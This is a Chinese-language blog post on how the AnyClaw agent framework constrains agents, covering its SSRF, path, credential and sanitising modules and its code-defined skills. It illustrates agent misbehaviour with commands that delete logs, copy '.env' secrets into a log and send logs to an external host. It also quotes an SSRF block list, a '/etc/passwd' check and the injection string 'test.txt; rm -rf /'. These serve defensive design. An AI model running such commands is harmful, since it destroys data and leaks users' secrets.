---
title: "AnyClaw：Agent 框架中的安全约束设计"
description: "从实践角度分析 AI Agent 框架中安全边界的设计，以及 Skill 代码化的工程意义"
pubDate: 2026-03-23
tags: ["AI Agent", "安全设计", "架构", "AnyClaw"]
author: "Ryan"
---

## 引言

在开发 AnyClaw 的过程中，我遇到的核心问题不是"如何让 Agent 更聪明"，而是"如何让 Agent 更可控"。

当 Agent 拥有执行代码、访问文件、调用 API 的能力时，**控制边界比能力边界更重要**。这篇文章分享我在设计 AnyClaw 时对安全约束的思考。

## 为什么安全不是可选项

### 一个真实的场景

假设你给 Agent 一个指令："帮我整理一下项目里的日志文件"。

如果 Agent 没有安全约束，它可能会：

```bash
# Agent 可能执行的操作
rm -rf logs/*                    # 清空日志目录
cat .env >> logs/debug.log       # 把敏感信息写入日志
curl http://external.site/logs   # 把日志发送到外部服务器
```

这不是 Agent "不听话"，而是 **Agent 没有明确的边界概念**。

### 传统安全模型的局限

传统软件的安全模型基于"用户身份"：

```
用户登录 → 验证权限 → 允许操作
```

但 Agent 的场景更复杂：

```
用户 → Prompt → Agent 理解 → Agent 决策 → Agent 执行
```

在这个链路中，任何一个环节都可能出现偏差：
- **理解偏差**：Agent 对"整理"的理解可能和用户不同
- **决策偏差**：Agent 可能选择了一个"效率更高"但风险更大的方案
- **执行偏差**：Agent 可能误判了操作的影响范围

## AnyClaw 的安全模块

### 四层安全防护

AnyClaw 提供四个独立的安全模块，开发者可以根据需要选用：

```
┌─────────────────────────────────────────────────────┐
│  SSRFGuard     │ 网络请求安全，阻止内网访问         │
├─────────────────────────────────────────────────────┤
│  PathGuard     │ 文件系统安全，限制可访问目录       │
├─────────────────────────────────────────────────────┤
│  CredentialManager │ 凭证管理，加密存储 + 日志脱敏  │
├─────────────────────────────────────────────────────┤
│  Sanitizer     │ 输入净化，防止命令注入             │
└─────────────────────────────────────────────────────┘
```

这些是 **工具模块**，不是强制框架。开发者需要主动集成到自己的 Skill 中。

### SSRFGuard：网络请求安全

Agent 经常需要发起 HTTP 请求。SSRFGuard 可以拦截对内网的访问：

```python
from anyclaw.security import SSRFGuard

guard = SSRFGuard(
    blocked_hosts=["localhost", "127.0.0.1", "169.254.*", "10.*"],
    allowed_schemes=["http", "https"]
)

await guard.validate_url("http://169.254.169.254/latest/meta-data")
# → SSRF attempt blocked: internal IP address
```

### PathGuard：文件系统安全

限制文件操作只能在指定目录内：

```python
from anyclaw.security import PathGuard

guard = PathGuard(
    allowed_dirs=["~/.anyclaw/workspace"],
    resolve_symlinks=True
)

guard.validate("/etc/passwd")
# → PathSecurityError: Path outside allowed directories
```

### CredentialManager：凭证管理

API Key 等敏感信息的加密存储和日志脱敏：

```python
from anyclaw.security import CredentialManager, mask_sensitive

manager = CredentialManager()
manager.store("openai_api_key", "sk-xxxxx")

log.info(f"Using API key: {mask_sensitive('sk-xxxxx')}")
# 输出: Using API key: sk-****
```

### Sanitizer：输入净化

净化用户输入，防止命令注入：

```python
from anyclaw.security import sanitize_command

user_input = "test.txt; rm -rf /"
safe_input = sanitize_command(user_input)
```

## Skill：代码化约束的思路

### 自然语言的模糊性

很多团队尝试用 Prompt 约束 Agent 行为：

```
你是一个数据分析助手，请遵守以下规则：
1. 只读取 CSV 文件
2. 不要修改原始数据
3. 输出格式为 Markdown 表格
```

这种方式有几个问题：

**1. 理解偏差** — "只读取"是什么意思？

**2. 指令遗忘** — 长对话中 LLM 会遗忘早期指令

**3. 无法测试** — 无法为自然语言约束编写单元测试

### 代码化约束的思路

AnyClaw 的 Skill 设计理念是：**用代码定义行为边界，而不是用自然语言描述**。

```python
from anyclaw.skills import Skill
from anyclaw.security import PathGuard

class DataAnalyzerSkill(Skill):
    """数据分析技能"""

    def __init__(self):
        # 开发者主动集成安全模块
        self.guard = PathGuard(allowed_dirs=["~/data"])
        self.allowed_extensions = [".csv", ".json"]

    async def execute(self, file_path: str, **kwargs) -> str:
        # 代码层面的强制检查
        self.guard.validate(file_path)

        if not any(file_path.endswith(ext) for ext in self.allowed_extensions):
            return "Error: Only CSV and JSON files are supported"
```

对比两种方式：

| 维度 | 自然语言 Prompt | Skill 代码 |
|------|----------------|-----------|
| 执行确定性 | 可能偏差 | 代码即逻辑 |
| 可审计性 | 模糊边界 | 清晰可见 |
| 可测试性 | 无法测试 | 单元测试覆盖 |
| 可维护性 | 修改需重写 | 版本控制 |

### 这不是自动的

需要强调的是：**AnyClaw 不会自动给 Skill 添加安全检查**。

开发者需要：
1. 识别 Skill 的风险点
2. 选择合适的安全模块
3. 主动集成到 Skill 代码中

这是一种 **"提供工具，但不强制使用"** 的设计。

## Skill 开发工具

AnyClaw 提供了基础的 Skill 开发命令：

```bash
# 创建 Skill 模板
anyclaw skill create my-skill

# 验证 Skill 格式
anyclaw skill validate ./my-skill

# 打包 Skill
anyclaw skill package ./my-skill

# 安装 Skill
anyclaw skill install ./my-skill
```

`skill create` 会生成一个包含 `SKILL.md` 的目录模板，开发者需要自己填充内容和安全逻辑。

## 渐进式加载

### 问题：上下文窗口限制

50 个 Skill × 2000 tokens = 100K tokens，这不可持续。

### 解决方案：摘要 + 按需加载

```python
# 只注入摘要
skills_summary = build_skills_summary()  # ~3K tokens

# 按需加载完整内容
if agent_decides_to_use("data-analyzer"):
    skill_content = load_skill("data-analyzer")
```

## 多通道设计

AnyClaw 使用统一的消息结构，支持多个渠道：

```python
@dataclass
class InboundMessage:
    channel: str          # 来源：cli/feishu/discord/desktop
    sender_id: str
    chat_id: str
    content: str
    timestamp: datetime
    metadata: dict
```

## 项目现状

| 指标 | 数值 |
|------|------|
| 完成特性 | 60 个 |
| 测试数量 | 965 个 |
| 内置技能 | 17 个 |
| 支持渠道 | CLI / Discord / 飞书 / 桌面应用 |

## 通过对话创建 Skill

AnyClaw 内置了 `skill-creator` 技能，支持通过自然语言对话动态创建新的 Skill：

```
用户: 帮我创建一个读取 CSV 文件并生成统计报告的技能
Agent: 好的，我来创建这个 Skill...
       [调用 create_skill 工具]
       ✓ 创建了 skills/csv-reporter/SKILL.md
       请告诉我这个技能需要支持哪些具体的统计功能？
用户: 需要计算平均值、最大值、最小值
Agent: [更新 SKILL.md 内容]
       ✓ 已添加统计功能说明
```

### 兼容性设计

AnyClaw 的 Skill 格式兼容 OpenClaw 和其他 Claw 框架：

```
skill-name/
├── SKILL.md (required)
│   ├── YAML frontmatter: name, description
│   └── Markdown 指令
└── Bundled Resources (optional)
    ├── scripts/     - 可执行脚本
    ├── references/  - 参考文档
    └── assets/      - 资源文件
```

这意味着：
- OpenClaw 的 Skill 可以直接在 AnyClaw 中使用
- Claude Code 的 Skill 格式也兼容
- 社区开发的 Skill 可以跨框架共享

### Skill Creator 提供的工具

| 工具 | 功能 |
|------|------|
| `create_skill` | 创建新 Skill 目录和模板 |
| `reload_skill` | 热重载，无需重启 |
| `validate_skill` | 验证 Skill 格式 |
| `show_skill` | 显示 Skill 详情 |

## 待解决的问题

**1. 安全模块需要手动集成**

目前安全模块是可选的工具，需要开发者主动使用。未来可能需要更智能的检测机制。

**2. 缺少权限声明系统**

Skill 没有声明式的权限配置，安装时也没有权限提示。

## 结语

AnyClaw 的安全设计思想可以总结为：

1. **提供安全工具，但不强制使用** — 开发者需要主动集成
2. **代码约束优于自然语言** — 在关键边界上增加确定性
3. **渐进式加载** — 工程权衡，支持大规模 Skill

如果你对 Agent 框架的安全设计有兴趣，欢迎看看 AnyClaw 的实现。
